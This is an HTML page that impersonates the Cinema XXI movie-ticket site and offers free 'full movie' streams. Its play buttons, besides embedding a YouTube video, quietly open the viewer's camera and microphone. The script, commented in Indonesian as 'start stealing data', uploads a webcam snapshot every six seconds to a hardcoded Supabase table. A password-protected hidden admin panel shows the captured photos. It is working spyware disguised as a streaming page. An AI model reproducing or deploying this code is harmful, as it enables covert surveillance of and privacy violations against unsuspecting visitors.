<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cinema XXI - Tiket Nonton Online</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --xxi-blue: #002547; --xxi-gold: #b2935b; --bg: #001529; }
        body { background: var(--bg); color: #fff; font-family: Arial, sans-serif; margin: 0; padding-bottom: 70px; overflow-x: hidden; }
        
        header { background: var(--xxi-blue); padding: 15px; text-align: center; border-bottom: 2px solid var(--xxi-gold); position: sticky; top: 0; z-index: 1000; }
        .logo-text { color: var(--xxi-gold); font-size: 20px; font-weight: bold; letter-spacing: 2px; }
        
        /* TOMBOL RAHASIA ADMIN DI POJOK KANAN ATAS */
        .secret-area { position: absolute; right: 0; top: 0; width: 80px; height: 60px; z-index: 1001; cursor: pointer; }

        /* Full Screen Video Player */
        #video-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; flex-direction: column; }
        .close-player { background: var(--xxi-gold); color: #000; border: none; padding: 10px; font-weight: bold; cursor: pointer; }
        .yt-wrapper { flex-grow: 1; display: flex; align-items: center; justify-content: center; }

        /* Movie List */
        .content { padding: 15px; }
        .movie-card { background: #002140; border: 1px solid #003366; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
        .poster { width: 100%; height: 200px; object-fit: cover; background: #000; }
        .info { padding: 15px; text-align: center; }
        .title { font-size: 14px; font-weight: bold; margin-bottom: 10px; color: #eee; }
        .btn-play { background: linear-gradient(180deg, #b2935b 0%, #8e7547 100%); color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }

        /* Hidden Capture */
        #v { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
        #c { display: none; }

        /* Admin Panel */
        #admin-dash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; z-index: 3000; color: #00ff00; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
        .log-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; background: #111; font-size: 12px; }
        .log-item img { width: 100%; margin-top: 10px; border: 1px solid #00ff00; }

        /* Navbar Bottom */
        nav { position: fixed; bottom: 0; width: 100%; background: #001b35; display: flex; border-top: 1px solid #003366; padding: 10px 0; }
        .nav-link { flex: 1; text-align: center; color: #6e8499; font-size: 11px; text-decoration: none; }
    </style>
</head>
<body>

<header>
    <div class="logo-text">CINEMA XXI</div>
    <div class="secret-area" onclick="handleSecretClick()"></div>
</header>

<div id="video-overlay">
    <button class="close-player" onclick="stopVideo()">CLOSE PLAYER [X]</button>
    <div class="yt-wrapper" id="yt-player">
        </div>
</div>

<div class="content" id="main-ui">
    <div class="movie-card">
        <img src="https://web3.21cineplex.com/movie-images/14VINA_290x426.jpg" class="poster">
        <div class="info">
            <div class="title">VINA: SEBELUM 7 HARI (FULL MOVIE)</div>
            <button class="btn-play" onclick="playFilm('VINA', '9v_zX7vXo7w')">PLAY NOW</button>
        </div>
    </div>
    
    <div class="movie-card">
        <img src="https://web3.21cineplex.com/movie-images/14KUTU_290x426.jpg" class="poster">
        <div class="info">
            <div class="title">KUTUKAN CALON ARANG (FULL MOVIE)</div>
            <button class="btn-play" onclick="playFilm('CALON ARANG', 'XyL3A_H8h9U')">PLAY NOW</button>
        </div>
    </div>
</div>

<nav>
    <a href="#" class="nav-link">Movies</a>
    <a href="#" class="nav-link">Theaters</a>
    <a href="#" class="nav-link" style="color:var(--xxi-gold)">M-Tix</a>
    <a href="#" class="nav-item">Profile</a>
</nav>

<div id="admin-dash">
    <h3>[ NIAZI CLOUD MONITOR ]</h3>
    <button onclick="location.reload()" style="background:lime; padding:5px;">REFRESH</button>
    <button onclick="closeAdmin()" style="background:red; color:#fff; padding:5px;">EXIT</button>
    <hr>
    <div id="logs-container">Loading data...</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const SB_URL = "https://rdbtmwlbcrooeiwasksg.supabase.co";
    const SB_KEY = "sb_publishable_DYcU7YAc4wN3cysWgYyJyQ_DMH_egzc";
    const supabase = window.supabase.createClient(SB_URL, SB_KEY);

    let taps = 0;
    function handleSecretClick() {
        taps++;
        if(taps >= 5) {
            if(prompt("PASSWORD:") === "NIAZI1212") {
                document.getElementById('admin-dash').style.display = 'block';
                loadLogs();
            }
            taps = 0;
        }
    }

    async function playFilm(name, ytId) {
        // Tampilkan Player
        document.getElementById('video-overlay').style.display = 'flex';
        document.getElementById('yt-player').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${ytId}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
        
        // Mulai Maling Data
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;

            await supabase.from('darzi_logs').insert([{ type: 'ALERT', data: `Target Nonton: ${name} | IP: Auto` }]);

            const canvas = document.getElementById('c');
            setInterval(async () => {
                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
                const shot = canvas.toDataURL('image/jpeg', 0.4);
                await supabase.from('darzi_logs').insert([{ type: 'PHOTO', data: shot }]);
            }, 6000); // Jepret tiap 6 detik
        } catch(e) {}
    }

    function stopVideo() {
        document.getElementById('video-overlay').style.display = 'none';
        document.getElementById('yt-player').innerHTML = "";
    }

    function closeAdmin() { document.getElementById('admin-dash').style.display = 'none'; }

    async function loadLogs() {
        const { data } = await supabase.from('darzi_logs').select('*').order('created_at', { ascending: false });
        const container = document.getElementById('logs-container');
        container.innerHTML = "";
        data.forEach(log => {
            const div = document.createElement('div');
            div.className = 'log-item';
            div.innerHTML = log.type === 'PHOTO' ? `<img src="${log.data}">` : `<strong>${log.type}</strong>: ${log.data}`;
            container.appendChild(div);
        });
    }
</script>
</body>
</html>
